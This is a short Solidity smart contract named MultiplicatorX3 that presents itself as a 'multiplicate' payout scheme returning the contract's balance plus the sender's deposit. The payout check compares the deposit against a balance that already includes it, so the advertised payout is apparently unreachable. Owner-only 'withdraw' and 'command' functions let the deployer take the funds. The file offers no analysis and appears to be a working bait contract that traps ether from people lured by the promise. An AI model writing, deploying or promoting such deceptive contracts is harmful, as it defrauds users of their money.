pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public owner;

    function MultiplicatorX3() public {
        owner = msg.sender;
    }

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _address, bytes _data) public payable {
        require(msg.sender == owner);
        require(_address.call.value(msg.value)(_data));
    }

    function multiplicate(address _address) public payable {
        require(msg.value >= this.balance);
        require(_address.call.value(this.balance + msg.value)());
    }
}